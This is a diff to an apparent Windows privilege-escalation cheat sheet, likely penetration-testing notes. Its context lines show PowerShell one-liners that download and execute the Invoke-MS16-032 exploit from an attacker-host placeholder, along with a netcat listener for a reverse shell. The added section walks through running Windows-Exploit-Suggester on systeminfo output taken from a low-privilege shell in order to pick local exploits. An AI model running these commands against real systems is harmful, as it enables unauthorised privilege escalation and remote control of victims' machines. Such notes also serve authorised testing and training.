@@ -37,3 +37,21 @@ Invoke-MS16-032 -Command "iex(New-Object Net.WebClient).DownloadString('http://<
 # nc -lvp <port>
 IEX(New-Object Net.Webclient).downloadString('http://<attackingip>/Invoke-MS16032.ps1')
 ```
+
+#### Using Windows-Exploit-Suggester
+```
+# Run systeminfo from your low priv shell. Copy and paste into a document on attacking box, systeminfo.txt
+systeminfo
+
+# Get Windows-Exploit-Suggester on your attacking machine
+git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
+
+# Update WES. This will create a xls database
+./windows-exploit-suggester.py --update
+
+# Ensure python-xlrd is installed
+apt install python-xlrd
+
+# Run WES against xls database and systeminfo output
+./windows-exploit-suggester.py --database 2020-01-02-mssb.xls --systeminfo systeminfo.txt
+```
